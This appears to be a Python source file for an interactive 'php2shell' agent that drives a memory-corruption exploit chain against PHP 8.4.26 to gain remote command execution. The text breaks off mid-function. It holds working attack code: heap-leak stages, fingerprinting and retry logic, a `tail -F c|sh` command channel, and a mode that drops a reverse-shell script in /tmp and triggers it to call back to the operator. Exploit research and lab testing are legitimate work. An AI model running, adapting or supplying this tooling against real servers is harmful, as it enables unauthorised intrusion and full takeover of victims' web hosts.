#!/usr/bin/env python3
"""php2shell interactive shell agent.

Speaks JSON lines on stdio (requests in, events/results out). All heap
grooming primitives come from exploit.py in the same directory. Leaked
addresses (Zend MM chunk base + libphp base) are cached once, so every
subsequent command costs only a single stage-3 run.

Shell modes (probed in this order):
  resp     - command output is captured from the stage-3 HTTP response body
             (fastest; command <= 14 bytes)
  fetch    - command writes to '<script dir>/o' in the webroot via `CMD>o`,
             agent GETs it afterwards (command <= 12 bytes)
  tail     - one-time `tail -F c|sh` kept running in a worker; commands are
             appended to file `c` in short metachar-free chunks, output
             streams back over the held-open response (arbitrary length,
             no |;&<>()`'\" in commands, spaces written as $IFS)
  tmpdrop  - uploads a reverse-shell script as a multipart file part that
             survives the worker abort in /tmp/phpXXXXXX, then triggers
             `sh</tmp/p*` until the script runs and connects back
             (true interactive shell over a TCP callback)

Protocol (one JSON object per line):
  in : {"id":"1","op":"config","params":{...}}
       {"id":"2","op":"pwn"}
       {"id":"3","op":"open_shell","params":{"mode":"auto"}}
       {"id":"4","op":"exec","params":{"cmd":"id"}}
       {"id":"5","op":"shell_input","params":{"data":"aGkK"}}   (b64, revshell)
       {"id":"6","op":"kill_shell"}
       {"id":"7","op":"raw","params":{"args":[...]}}            (exploit.py CLI)
  out: {"type":"log"|"stage"|"state"|"shell_data"|"shell_status"}
       {"type":"result","id":"1","ok":true,"data":{...}}
"""
from __future__ import annotations

import base64
import json
import os
import posixpath
import re
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
from collections import Counter, deque

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)

import exploit as ex  # noqa: E402

# Diagnostic hooks: remember what the last leak attempt actually saw so failed
# stages can report WHY (no Set-Cookie at all vs short cookie vs weak pattern).
_orig_parse_cookie = ex.parse_cookie
_last_cookie_len = {"v": 0}
_last_leak_stats: dict = {"checked": False, "ptrs": 0, "groups": 0, "best": 0}


def _parse_cookie_diag(resp: bytes) -> bytes:
    raw = _orig_parse_cookie(resp)
    _last_cookie_len["v"] = len(raw)
    return raw


ex.parse_cookie = _parse_cookie_diag

_orig_chunk_base = ex.chunk_base_from_cookie


def _chunk_base_diag(raw: bytes) -> int:
    """Mirror of the stage-1 scoring, collecting stats along the way."""
    _last_leak_stats.update({"checked": True, "ptrs": 0, "groups": 0, "best": 0})
    if len(raw) >= 1000:
        c: Counter[int] = Counter()
        for i in range(len(raw) - 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x7F0000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        if c:
            base, count = c.most_common(1)[0]
            _last_leak_stats.update({"ptrs": sum(c.values()),
                                     "groups": len(c), "best": count})
    return _orig_chunk_base(raw)


ex.chunk_base_from_cookie = _chunk_base_diag

_orig_libphp_base = ex.libphp_base_from_cookie


def _libphp_base_diag(raw: bytes, dtor_offset: int = ex.DTOR_OFFSET) -> int:
    _last_leak_stats.update({"checked": True, "ptrs": 0, "groups": 0, "best": 0})
    if len(raw) >= 16:
        p = int.from_bytes(raw[8:16], "little")
        if 0x7F0000000000 <= p < 0x800000000000:
            _last_leak_stats.update({"ptrs": 1, "groups": 1, "best": 1,
                                     "ptr": f"0x{p:x}",
                                     "page_ok": p & 0xFFF == dtor_offset & 0xFFF})
    return _orig_libphp_base(raw, dtor_offset)


ex.libphp_base_from_cookie = _libphp_base_diag

TAIL_TRIGGER = "tail -F c|sh"          # 12 bytes
FETCH_NAME = "o"                        # webroot output file
TAIL_NAME = "c"                         # webroot command fifo-file
ECHO_BUDGET = 6                         # "echo X>>c"  -> X <= 6
PRINTF_BUDGET = 4                       # "printf X>>c" -> X <= 4
BAD_CHARS = set("|;&<>()`'\"\\\n\r\t")


def b64e(s) -> str:
    if isinstance(s, str):
        s = s.encode()
    return base64.b64encode(s).decode()


class Emitter:
    """Fans every event out to all connected daemon clients (and stdout)."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.clients: list[tuple[socket.socket, str]] = []

    def add(self, sock: socket.socket, peer: str) -> None:
        with self._lock:
            self.clients.append((sock, peer))

    def remove(self, sock: socket.socket) -> None:
        with self._lock:
            self.clients = [(s, p) for (s, p) in self.clients if s is not sock]

    def emit(self, obj: dict) -> None:
        line = json.dumps(obj, separators=(",", ":")) + "\n"
        data = line.encode()
        with self._lock:
            targets = list(self.clients)
        for sock, _peer in targets:
            try:
                sock.sendall(data)
            except OSError:
                self.remove(sock)
        if not targets:
            try:
                sys.stdout.write(line)
                sys.stdout.flush()
            except OSError:
                pass


class ShellAgent:
    def __init__(self, ev: Emitter) -> None:
        self.ev = ev
        self.t: ex.Target | None = None
        self.x: ex.Exploit | None = None
        self.cfg: dict = {}
        self.chunk = 0
        self.libphp = 0
        self.mode: str | None = None
        self.modes: dict = {"resp": False, "fetch": False, "tail": False, "tmpdrop": False}
        self.shell_open = False
        self.stream_stop = threading.Event()
        self.revsock: socket.socket | None = None
        self.listen_sock: socket.socket | None = None
        self.lock = threading.Lock()
        self.last_output_file = b""
        self.stages: dict[str, dict] = {}
        self.logs: deque = deque(maxlen=2000)
        self.configured_key: tuple | None = None

    # ---------------- events ----------------

    def log(self, msg: str, level: str = "info") -> None:
        self.logs.append({"ts": int(time.time() * 1000), "level": level, "msg": msg})
        self.ev.emit({"type": "log", "level": level, "msg": msg})

    def stage(self, name: str, status: str, detail: str = "") -> None:
        self.stages[name] = {"status": status, "detail": detail}
        self.ev.emit({"type": "stage", "stage": name, "status": status, "detail": detail})

    def shell_status(self, status: str, detail: str = "") -> None:
        self.last_shell_status = {"status": status, "detail": detail}
        self.ev.emit({"type": "shell_status", "status": status, "detail": detail})

    def shell_data(self, data) -> None:
        self.ev.emit({"type": "shell_data", "data": b64e(data)})

    def state_event(self) -> None:
        self.ev.emit({
            "type": "state",
            "state": ("shell" if self.shell_open else
                      "ready" if (self.chunk and self.libphp) else
                      "error" if self.cfg.get("failed") else "idle"),
            "mode": self.mode,
            "modes": self.modes,
            "leaks": {
                "chunk": f"0x{self.chunk:x}" if self.chunk else None,
                "libphp": f"0x{self.libphp:x}" if self.libphp else None,
                "htdata": f"0x{self.htdata():x}" if self.htdata() else None,
                "zif": f"0x{self.zif():x}" if self.zif() else None,
            },
        })

    # ---------------- derived ----------------

    def htdata(self) -> int:
        return self.chunk + self.x.htdata_offset if (self.x and self.chunk) else 0

    def zif(self) -> int:
        return self.libphp + self.x.zif_offset if (self.x and self.libphp) else 0

    def fetch_path(self) -> str:
        base = self.t.path.rstrip("/")
        if base.endswith(".php"):
            base = base.rsplit("/", 1)[0]
        return (base or "") + "/" + FETCH_NAME

    def fetch_url_dir(self) -> str:
        base = self.t.path.rstrip("/")
        if base.endswith(".php"):
            base = base.rsplit("/", 1)[0]
        return base or "/"

    def detect_callback_ip(self) -> str:
        ip = self.cfg.get("callback_ip")
        if ip:
            return ip
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2.0)
            s.connect((self.t.host, self.t.port))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except OSError:
            return "127.0.0.1"

    # ---------------- exploit plumbing ----------------

    def fresh_worker(self) -> None:
        self.log("[*] rotating worker")
        self.x.rotate()

    PRIVATE_HOST_RE = re.compile(
        r"^(10\.|127\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|169\.254\.)")

    def _raw_get(self, path: str) -> tuple[int, dict[str, list[str]], bytes]:
        """GET that returns parsed status/headers/body (the exploit client's
        Target.get only returns status+body; the headers carry the diagnosis)."""
        hdr = (f"GET {path} HTTP/1.1\r\nHost: {self.t.host}:{self.t.port}\r\n"
               "Connection: close\r\n\r\n").encode()
        s = self.t._connect()
        s.settimeout(self.t.timeout)
        data = bytearray()
        try:
            s.sendall(hdr)
            while len(data) < (1 << 20):
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except OSError:
            pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        status = int(m.group(1)) if m else 0
        if status == 0:
            raise ValueError(
                f"TCP open but no HTTP response from {self.t.host}:{self.t.port} "
                "via the exploit client - check http:// vs https://, the port, and "
                "that the URL path points at the PHP page")
        headers: dict[str, list[str]] = {}
        for line in head.split(b"\r\n")[1:]:
            if b":" in line:
                k, v = line.split(b":", 1)
                headers.setdefault(k.strip().lower().decode("latin1"),
                                   []).append(v.strip().decode("latin1"))
        return status, headers, body

    def _resolve_location(self, loc: str, cur: str, host: str,
                          port: int) -> str | None:
        """Resolve a Location header to a same-host path (None = cannot follow)."""
        loc = loc.strip()
        u = urllib.parse.urlsplit(loc)
        if u.scheme in ("http", "https"):
            hop_port = u.port or (443 if u.scheme == "https" else 80)
            if u.hostname != host or hop_port != port:
                self.log(f"[-] preflight: redirect leaves the target host ({loc}) "
                         "- point the URL at that page directly instead", "warn")
                return None
            return u.path or "/"
        if loc.startswith("/"):
            return u.path or "/"
        base = cur.rsplit("/", 1)[0]
        return posixpath.normpath(f"{base}/{u.path}") or "/"

    _PROBE_BOUNDARY = b"P2Sprobe00"

    def _probe_post(self, progress: bool = True,
                    huge_mb: int | None = None) -> tuple[int, bool]:
        """Minimal multipart POST shaped like the exploit's requests; returns
        (status, has Set-Cookie PHPSESSID). No session cookie is sent, so PHP
        must create a fresh session - exactly when Set-Cookie appears."""
        parts: list[dict] = []
        if progress:
            parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"probe"})
        parts.append({"name": "f", "filename": "p.txt", "data": b"A" * 64})
        if huge_mb:
            parts.append({"name": "big", "data": b"B" * (huge_mb * 1024 * 1024)})
        resp = self.t.post(ex.build_multipart(parts, self._PROBE_BOUNDARY),
                           self._PROBE_BOUNDARY, read_cap=1 << 16,
                           timeout=max(90.0, self.t.timeout))
        head_raw = resp.partition(b"\r\n\r\n")[0]
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head_raw)
        status = int(m.group(1)) if m else 0
        return status, b"set-cookie: phpsessid=" in head_raw.lower()

    def _session_upload_probe(self) -> None:
        """GO/NO-GO gate before any exploit attempt.

        The whole php2shell chain (Wiz/Datadog writeups) rides on PHP's
        rfc1867 upload-progress handler: the POST must reach PHP and make it
        start a session (fresh Set-Cookie PHPSESSID). If that does not happen,
        no amount of retries can help - fail the run right here with the
        precise reason instead of burning attempts."""
        try:
            st, ok = self._probe_post(progress=True)
        except OSError as e:
            raise ValueError(f"upload probe request failed ({e})") from e
        self.log(f"[*] preflight: upload probe (PHP_SESSION_UPLOAD_PROGRESS, "
                 f"POST {self.t.path}) -> HTTP {st}"
                 + (", Set-Cookie PHPSESSID ok" if ok else ", no Set-Cookie"))
        if not ok:
            try:
                st0, ok0 = self._probe_post(progress=False)
            except OSError:
                st0, ok0 = 0, False
            self.log(f"[*] preflight: control probe (plain POST, no upload "
                     f"field) -> HTTP {st0}"
                     + (", Set-Cookie ok" if ok0 else ", no Set-Cookie"))
            if ok0:
                raise ValueError(
                    "a plain POST gets a session cookie but the "
                    "PHP_SESSION_UPLOAD_PROGRESS one does not - "
                    "session.upload_progress.enabled=0 on this target; the "
                    "exploit needs it (default On). Cannot proceed.")
            raise ValueError(
                f"upload probe: no Set-Cookie PHPSESSID (with field: HTTP {st}, "
                f"control: HTTP {st0}) - the exploit POST is not reaching PHP's "
                "session handler. Usual causes: the URL is not a PHP page "
                "(redirect/static/404 - check the retarget line above), "
                "session.upload_progress.enabled=0, session.use_cookies=0, or a "
                "custom session.name. Point the URL at the app's PHP entry page "
                "(e.g. its login page).")
        self.log("[+] preflight: session upload accepted - proceeding")
        # Verify the multi-MB body the exploit needs is not swallowed by a
        # body-size limit (nginx client_max_body_size defaults to 1M) or
        # post_max_size. PHP silently drops oversized bodies without a 413,
        # so calibrate huge_mb down until the session still starts.
        base = int(self.cfg.get("huge_mb", 12) or 12)
        for mb in dict.fromkeys([base, 8, 7, 2]):
            try:
                st, ok = self._probe_post(progress=True, huge_mb=mb)
            except OSError as e:
                raise ValueError(f"{mb}MB body probe request failed ({e})") from e
            self.log(f"[*] preflight: body probe ({mb}MB) -> HTTP {st}"
                     + (", Set-Cookie ok" if ok else ", no Set-Cookie"))
            if st == 413:
                raise ValueError(
                    f"body probe: the server rejects {mb}MB POSTs (HTTP 413) - a "
                    "body-size limit (nginx client_max_body_size defaults to 1M; "
                    "PHP default post_max_size=8M) is below what this exploit "
                    "needs (huge_mb must exceed the target memory_limit). Cannot "
                    "exploit as configured.")
            if ok:
                if mb != self.x.huge_mb:
                    self.x.huge_mb = mb
                    self.log(f"[*] adaptive: huge_mb -> {mb}MB (largest body the "
                             "target still turns into a session)", "warn")
                return
        raise ValueError(
            "body probe: even a 2MB upload POST gets no Set-Cookie while the 1KB "
            "one does - post_max_size is under 2MB (PHP default is 8M; check the "
            "server config). This exploit needs a multi-MB POST; cannot proceed.")

    def preflight(self) -> None:
        """Fail fast with an actionable message if the target is unreachable,
        fingerprint the page, follow redirects to the real PHP entry point, and
        prove the session-upload request works BEFORE spending attempts."""
        host, port = self.t.host, self.t.port
        try:
            s = socket.create_connection((host, port), timeout=8.0)
            s.close()
        except OSError as e:
            hint = ""
            if self.PRIVATE_HOST_RE.match(host):
                hint = (" - private/VPN addresses are only routable inside their own "
                        "network; run this console where the target is reachable "
                        "(locally: docker compose up --build) or use a publicly "
                        "reachable target URL")
            raise ValueError(f"cannot reach {host}:{port} ({e}){hint}") from e
        # Follow GET redirects (up to 4 hops). nginx commonly 301s /index.php to
        # /index.php/; a POST to the original path would bounce off the redirect
        # and never reach PHP (=> "no Set-Cookie at all" on every attempt).
        path = self.t.path
        status, headers, body = 0, {}, b""
        hops = 0
        while True:
            status, headers, body = self._raw_get(path)
            self.log(f"[*] preflight: GET {path} -> HTTP {status} ({len(body)} bytes)"
                     + (f" [redirect hop {hops}]" if hops else ""))
            if (status in (301, 302, 303, 307, 308) and "location" in headers
                    and hops < 4):
                nxt = self._resolve_location(headers["location"][0], path, host, port)
                if nxt is None:
                    break
                path = nxt
                hops += 1
                continue
            break
        if hops and path != self.t.path:
            self.t.path = path
            self.log(f"[*] preflight: exploit POST path retargeted to {path}", "warn")
        server = "; ".join(headers.get("server", []))
        powered = "; ".join(headers.get("x-powered-by", []))
        setcookies = headers.get("set-cookie", [])
        if server:
            self.log(f"[*] preflight: server: {server}")
        if powered:
            self.log(f"[*] preflight: powered-by: {powered}")
            mv = re.search(r"PHP/([\d.]+)", powered)
            if mv and mv.group(1) != "8.4.26":
                self.log(f"[-] preflight: target runs PHP {mv.group(1)} but the "
                         "exploit is calibrated for 8.4.26 - leaks will likely "
                         "keep failing on this build", "warn")
        # Apache patch level fingerprints the two calibrated builds
        if "Apache/2.4.68" in server and self.x.profile == "bookworm":
            self.log("[!] preflight: Apache/2.4.68 looks like the 'lab' build - "
                     "select profile=lab (the agent also auto-probes it after "
                     "3 missed attempts)", "warn")
        elif "Apache/2.4.69" in server and self.x.profile == "lab":
            self.log("[!] preflight: Apache/2.4.69 looks like the 'bookworm' "
                     "build - select profile=bookworm", "warn")
        if setcookies:
            names = [c.split("=", 1)[0] for c in setcookies]
            self.log(f"[*] preflight: session cookie(s) on GET: {', '.join(names)}")
            if not any(n == "PHPSESSID" for n in names):
                self.log(f"[-] preflight: session cookie name is {names[0]!r}, "
                         "not PHPSESSID - the exploit expects the default "
                         "session.name", "warn")
        # Plain GET without a cookie is only a HINT (many apps start sessions
        # on other pages; upload progress starts one by itself). The upload
        # probe above is the authoritative go/no-go test.
        self._session_upload_probe()

    def _leak_diag(self, stage: str) -> None:
        """Explain the most common reasons a leak stage keeps failing."""
        n = _last_cookie_len["v"]
        if n <= 0:
            self.log(f"[-] {stage}: no PHPSESSID Set-Cookie leak observed - verify the "
                     "target: PHP 8.4.26 mod_php prefork, "
                     "session.upload_progress.enabled=1, session.use_strict_mode=0, "
                     "session.use_cookies=1", "warn")
        elif n < 1000:
            self.log(f"[-] {stage}: leak cookie only {n} bytes - grooming did not "
                     "reach the leak window; more retries may help", "warn")
        else:
            self.log(f"[-] {stage}: leak cookie present ({n} bytes) but no usable "
                     "pointer pattern - if this happens on every run, huge_mb "
                     f"(currently {self.x.huge_mb}MB) must exceed the target "
                     "memory_limit, and max_input_vars should be 1000", "warn")

    def _attempt_diag(self, stage: str) -> str:
        """One-line per-attempt explanation of a missed leak; returns category."""
        st = _last_leak_stats
        n = _last_cookie_len["v"]
        _last_leak_stats.pop("ptr", None)
        _last_leak_stats.pop("page_ok", None)
        if st.get("checked") and st.get("ptrs"):
            extra = ""
            if st.get("ptr") is not None:
                extra = f", ptr={st['ptr']} page_ok={bool(st.get('page_ok'))}"
            self.log(f"[-] {stage}: leak cookie {n}B, heap-ptr candidates "
                     f"{st.get('ptrs')}, best 2MB group {st.get('best')} "
                     f"(need >=8){extra}", "warn")
            return "pattern"
        if n > 0:
            self.log(f"[-] {stage}: leak cookie only {n}B (<1000) - grooming "
                     "missed the leak window this attempt", "warn")
            return "short"
        self.log(f"[-] {stage}: no Set-Cookie leak at all on this attempt - the "
                 "upload POST got no session (body-size limit? different backend "
                 "worker serving this request?)", "warn")
        return "none"

    def _apply_profile(self, name: str) -> bool:
        """Swap calibration tables to the other build profile at runtime."""
        x = self.x
        if x is None or x.profile == name:
            return False
        x.profile = name
        if name == "bookworm":
            x.stage1_n = ex.BOOKWORM_STAGE1_N
            x.stage2_t = ex.BOOKWORM_STAGE2_T
            x.stage2_v = ex.BOOKWORM_STAGE2_V
            x.stage3_pads = list(ex.BOOKWORM_STAGE3_PADS)
            x.stage3_carrier = True
            ht = ex.BOOKWORM_HTDATA_OFFSET
        else:
            x.stage1_n = 892
            x.stage2_t = 443
            x.stage2_v = 1
            x.stage3_pads = [(8, 7)] + [(7, 7)] * 5
            x.stage3_carrier = False
            ht = ex.HTDATA_OFFSET
        if self.cfg.get("htdata_offset") is None:
            x.htdata_offset = ht
        self.log(f"[*] adaptive: switching build profile to '{name}' "
                 f"(stage1_n={x.stage1_n})", "warn")
        return True

    def _adapt_huge_mb(self, category: str, misses: int) -> None:
        """Cycle the OOM field size when the diagnostics point at it."""
        base = int(self.cfg.get("huge_mb", 12) or 12)
        cycle = ([base, 8, 7, 2] if category == "none" else
                 [base, 7, 24] if category == "short" else [base, 24])
        new = cycle[misses % len(cycle)]
        if new != self.x.huge_mb:
            self.x.huge_mb = new
            self.log(f"[*] adaptive: huge_mb -> {new}MB", "warn")

    def run_stage3(self, cmd: str, read_cap: int = 1 << 20) -> bytes:
        """Mirror Exploit.stage3 but return the trigger request's raw response."""
        if len(cmd.encode()) > ex.MAX_CMD:
            raise ValueError(f"command exceeds {ex.MAX_CMD} bytes")
        htdata = self.htdata()
        zif = self.zif()
        ht, ref = self.x._fake_payload(htdata, zif)

        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.x.stage3_pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self.x._file_part(), self.x._big_field()]
        extra = None
        if self.x.profile == "bookworm":
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(ex.build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)

        parts2 = [
            {"name": "PHPSESSID", "data": ex.SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.x.stage3_carrier:
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts2.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts2.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts2.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts2.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts2.append({"name": f"f{i:02d}", "data": ref})
        return self.t.post(ex.build_multipart(parts2, b"B" * 10), b"B" * 10,
                           read_cap=read_cap, timeout=30.0)

    def response_body(self, resp: bytes) -> bytes:
        _, _, body = resp.partition(b"\r\n\r\n")
        return body

    # ---------------- ops ----------------

    def op_config(self, params: dict) -> dict:
        self.cfg = params or {}
        url = self.cfg.get("url") or ""
        if not url:
            return {"ok": False, "error": "missing url"}
        if self.cfg.get("mock"):
            # switching to mock: drop any real-target state
            self.chunk = 0
            self.libphp = 0
            self.mode = None
            self.shell_open = False
            self.stages.clear()
            self.configured_key = ("mock", url)
            self.log("[*] mock agent configured")
            self.state_event()
            return {"ok": True, "mock": True}
        key = (url, self.cfg.get("profile", "bookworm"),
               self.cfg.get("zif_offset"), self.cfg.get("dtor_offset"),
               self.cfg.get("htdata_offset"))
        if self.configured_key == key and self.t is not None and self.x is not None:
            self.log("[*] config unchanged; keeping cached leaks")
            self.state_event()
            return {"ok": True, "profile": self.x.profile, "unchanged": True}
        self.configured_key = key
        self.t = ex.Target(url, timeout=float(self.cfg.get("timeout", 30.0)),
                           verbose=False)
        kw = {}
        for src, dst in (("zif_offset", "zif_offset"), ("dtor_offset", "dtor_offset"),
                         ("htdata_offset", "htdata_offset")):
            if self.cfg.get(src) is not None:
                kw[dst] = int(self.cfg[src])
        self.x = ex.Exploit(self.t, self.cfg.get("cmd_default", "id"),
                            huge_mb=int(self.cfg.get("huge_mb", 12)),
                            profile=self.cfg.get("profile", "bookworm"),
                            verbose=False, **kw)
        self.log(f"[*] agent configured: {url} profile={self.x.profile}")
        self.state_event()
        return {"ok": True, "profile": self.x.profile}

    def op_pwn(self, _params: dict) -> dict:
        if self.cfg.get("mock"):
            time.sleep(0.4)
            self.stage("rotate", "done", "worker rotated")
            self.stage("stage1", "running")
            time.sleep(0.8)
            self.chunk = 0x7F4C00000000
            self.stage("stage1", "done", "chunk base = 0x7f4c00000000")
            self.stage("stage2", "running")
            time.sleep(0.8)
            self.libphp = 0x7F9A1ACDB000
            self.stage("stage2", "done", "libphp base = 0x7f9a1acdb000")
            if self.x is None:
                class _Stub:
                    htdata_offset = ex.BOOKWORM_HTDATA_OFFSET
                    zif_offset = ex.ZIF_OFFSET
                self.x = _Stub()
            self.modes = {"resp": True, "fetch": True, "tail": True, "tmpdrop": True}
            self.mode = "resp"
            self.state_event()
            return {"ok": True, "mock": True, "mode": "resp"}
        if not (self.t and self.x):
            return {"ok": False, "error": "not configured"}

        retries = int(self.cfg.get("retries", 25))

        self.stage("preflight", "running")
        try:
            self.preflight()
        except ValueError as e:
            self.stage("preflight", "failed", str(e))
            self.log(f"[-] {e}", "warn")
            self.state_event()
            return {"ok": False, "error": str(e)}
        self.stage("preflight", "done")

        self.stage("rotate", "running")
        try:
            self.fresh_worker()
        except (OSError, ValueError) as e:
            self.stage("rotate", "failed", str(e))
            return {"ok": False, "error": f"rotate failed: {e}"}
        self.stage("rotate", "done")

        self.stage("stage1", "running")
        misses = 0
        none_streak = 0
        for attempt in range(1, retries + 1):
            self.log(f"[*] stage 1: heap leak (attempt {attempt}/{retries})")
            try:
                self.chunk = self.x.stage1()
            except (OSError, ValueError) as e:
                self.log(f"[-] stage 1 error: {e}", "warn")
                self.chunk = 0
            if self.chunk:
                self.stage("stage1", "done", f"chunk base = 0x{self.chunk:x}")
                break
            misses += 1
            self.log("[-] heap leak missed", "warn")
            category = self._attempt_diag("stage 1")
            # "no Set-Cookie at all" is deterministic (routing/config), not
            # grooming luck - a few in a row means stop instead of burning the
            # whole retry budget on something retries cannot fix.
            none_streak = none_streak + 1 if category == "none" else 0
            if none_streak >= 4:
                self.stage("stage1", "failed",
                           "target never returns Set-Cookie on the upload requests")
                msg = (f"ABORTED: {none_streak} attempts in a row got no Set-Cookie "
                       "at all - retrying cannot fix this (request routing/config, "
                       "not grooming luck). Re-read the preflight probe lines above: "
                       "the exploit POST is not reaching PHP's session handler.")
                self.log(f"[!] {msg}", "warn")
                self.state_event()
                return {"ok": False, "error": msg}
            if attempt < retries:
                self.fresh_worker()
                # The two calibrated builds use different field counts; if the
                # chosen profile keeps missing, try the other one. Pointless
                # when there is no cookie at all - keep the profile then.
                if misses == 3 and category != "none":
                    other = "lab" if self.x.profile == "bookworm" else "bookworm"
                    self._apply_profile(other)
                self._adapt_huge_mb(category, misses)
        if not self.chunk:
            self.stage("stage1", "failed", "no 2MB-aligned chunk base in Set-Cookie")
            self._leak_diag("stage 1")
            n = _last_cookie_len["v"]
            self.state_event()
            return {"ok": False,
                    "error": (f"HEAP_LEAK_FAILED after {retries} attempts "
                              f"(last leak cookie: {n} bytes)")}

        self.stage("stage2", "running")
        none_streak = 0
        for attempt in range(1, retries + 1):
            self.log(f"[*] stage 2: libphp leak (attempt {attempt}/{retries})")
            try:
                self.libphp = self.x.stage2()
            except (OSError, ValueError) as e:
                self.log(f"[-] stage 2 error: {e}", "warn")
                self.libphp = 0
            if self.libphp:
                self.stage("stage2", "done", f"libphp base = 0x{self.libphp:x}")
                break
            self.log("[-] libphp leak missed", "warn")
            category = self._attempt_diag("stage 2")
            none_streak = none_streak + 1 if category == "none" else 0
            if none_streak >= 3:
                self.stage("stage2", "failed", "target stopped returning Set-Cookie")
                msg = ("ABORTED: stage 2 got no Set-Cookie at all on 3 consecutive "
                       "attempts - the target stopped behaving like it did during "
                       "stage 1 (worker pool exhausted? target crashed or reloaded? "
                       "requests landing on different backends?). Not retrying "
                       "further.")
                self.log(f"[!] {msg}", "warn")
                self.state_event()
                return {"ok": False, "error": msg}
            if attempt < retries:
                self.fresh_worker()
        if not self.libphp:
            self.stage("stage2", "failed", "no ZVAL_PTR_DTOR pointer in Set-Cookie")
            self._leak_diag("stage 2")
            n = _last_cookie_len["v"]
            self.state_event()
            return {"ok": False,
                    "error": (f"LIBPHP_LEAK_FAILED after {retries} attempts "
                              f"(last leak cookie: {n} bytes)")}

        self.log(f"[+] htdata=0x{self.htdata():x} zif=0x{self.zif():x}")
        self.state_event()
        probe_res = self.op_probe({})
        return {"ok": True, "chunk": f"0x{self.chunk:x}",
                "libphp": f"0x{self.libphp:x}", "probe": probe_res.get("data")}

    def op_probe(self, _params: dict) -> dict:
        """Try output channels; picks the best available one."""
        if self.cfg.get("mock"):
            self.modes = {"resp": True, "fetch": True, "tail": True, "tmpdrop": True}
            self.mode = "resp"
            self.state_event()
            return {"ok": True, "data": {"mode": "resp", "modes": self.modes}}
        if not (self.chunk and self.libphp):
            return {"ok": False, "error": "leaks not ready"}

        self.stage("probe", "running")
        try:
            self.fresh_worker()
            resp = self.run_stage3("id")
            body = self.response_body(resp)
            if b"uid=" in body:
                self.modes["resp"] = True
                self.log("[+] response mode works (output in HTTP body)")
            else:
                self.log("[-] response mode: no output in body", "warn")
        except (OSError, ValueError) as e:
            self.log(f"[-] response probe error: {e}", "warn")

        if not self.modes["resp"]:
            try:
                self.fresh_worker()
                self.run_stage3("id>" + FETCH_NAME)
                time.sleep(0.6)
                status, body = self.t.get(self.fetch_path())
                if status == 200 and b"uid=" in body:
                    self.modes["fetch"] = True
                    self.log("[+] fetch mode works (webroot write + GET)")
                else:
                    self.log(f"[-] fetch mode failed (GET status {status})", "warn")
            except (OSError, ValueError) as e:
                self.log(f"[-] fetch probe error: {e}", "warn")

        # tail mode uses the same primitives as fetch; availability is
        # verified live when the channel is opened.
        if self.modes["fetch"] or self.modes["resp"]:
            self.modes["tail"] = True
        self.modes["tmpdrop"] = True  # best-effort; validated at open time

        order = [m for m in ("resp", "fetch") if self.modes[m]]
        self.mode = order[0] if order else None
        self.stage("probe", "done" if self.mode else "failed",
                   f"best mode: {self.mode or 'none'}")
        self.state_event()
        return {"ok": bool(self.mode), "data": {"mode": self.mode, "modes": self.modes}}

    # ---- exec: resp / fetch ----

    def exec_resp(self, cmd: str) -> bytes:
        if len(cmd.encode()) > 14:
            raise ValueError("resp mode: command must be <= 14 bytes")
        self.fresh_worker()
        resp = self.run_stage3(cmd)
        return self.response_body(resp)

    def exec_fetch(self, cmd: str) -> bytes:
        if len(cmd.encode()) > 12:
            raise ValueError("fetch mode: command must be <= 12 bytes (CMD>o)")
        self.fresh_worker()
        self.run_stage3(cmd + ">" + FETCH_NAME)
        time.sleep(0.5)
        status, body = self.t.get(self.fetch_path())
        if status != 200:
            raise RuntimeError(f"output GET failed (HTTP {status})")
        return body

    # ---- exec: tail ----

    def _tail_stream_loop(self) -> None:
        """Fire `tail -F c|sh` once and keep reading the held-open response."""
        try:
            htdata = self.htdata()
            zif = self.zif()
            ht, ref = self.x._fake_payload(htdata, zif)
            parts = [
                {"name": "PHPSESSID", "data": b"a" * 19},
                {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
            ]
            for i, (nl, vl) in enumerate(self.x.stage3_pads):
                name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
                parts.append({"name": name, "data": b"V" * vl})
            parts += [self.x._file_part(), self.x._big_field()]
            extra = {"Cookie": "PHPSESSID=" + "a" * 32} if self.x.profile == "bookworm" else None
            self.t.post(ex.build_multipart(parts, b"S" * 17), b"S" * 17,
                        read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                        extra_headers=extra)
            time.sleep(0.3)

            parts2 = [
                {"name": "PHPSESSID", "data": ex.SID},
                {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            ]
            if self.x.stage3_carrier:
                carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
                for i in range(2):
                    parts2.append({"name": f"f{i:02d}", "data": b"F" * 15})
                parts2.append({"name": "g00", "data": carrier})
                for i in range(15):
